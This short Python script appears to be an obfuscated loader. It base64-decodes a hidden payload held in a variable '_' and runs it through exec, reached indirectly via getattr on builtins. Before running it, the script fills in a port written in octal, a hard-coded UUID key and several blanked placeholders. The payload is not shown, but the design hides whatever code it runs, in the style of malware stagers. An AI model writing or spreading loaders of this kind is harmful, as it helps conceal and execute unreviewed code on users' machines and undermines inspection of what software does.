import sys
from base64 import b64decode

sys.__std__ = __builtins__
__builtins__.getattr(sys.__std__, "exec")(
    b64decode(_).decode("utf8").replace(str(int("0o17620", 8)), str(8080))
    .replace("__key__", "b760d919-4ba6-4736-b081-233dfc081050")
    .replace("__vl__", "")
    .replace("__vm__", "")
    .replace("__tr__", "")
)